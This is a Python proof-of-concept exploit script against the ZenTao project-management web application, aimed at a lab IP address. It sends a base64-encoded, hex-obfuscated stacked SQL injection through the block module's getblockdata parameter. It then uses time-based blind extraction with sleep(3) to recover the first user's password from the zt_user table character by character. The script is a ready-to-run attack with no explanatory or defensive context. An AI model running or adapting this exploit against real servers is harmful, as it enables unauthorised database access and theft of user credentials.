import base64
import json,requests,re
import datetime
import binascii

url = 'http://192.168.58.129/zentao/'
payload = '/index.php?m=block&f=main&mode=getblockdata&blockid=case&param='



headers = {
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Accept-Encoding": "gzip, deflate",
    "Referer":url
}

name=''

for n in range(1,33):    
    for i in range(32,126):         # account(uname)   password
        poc='select (if (ascii(substr((select password from zt_user limit 0,1),%s,1))=%s,sleep(3),1))' % (n,i)
        by = bytes(poc,'UTF-8')    
        sql = by.hex()
     
        
        exp='{"orderBy":"order limit 1;SET @SQL=0x%s;PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}' % sql
        exp=str(base64.b64encode(exp.encode("utf-8")), "utf-8")
        print (exp)
        
        time1 = datetime.datetime.now()
        r=requests.get(url+payload+exp,headers=headers)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec>2:
            name=name+chr(i)
            print(name)
            break
        
            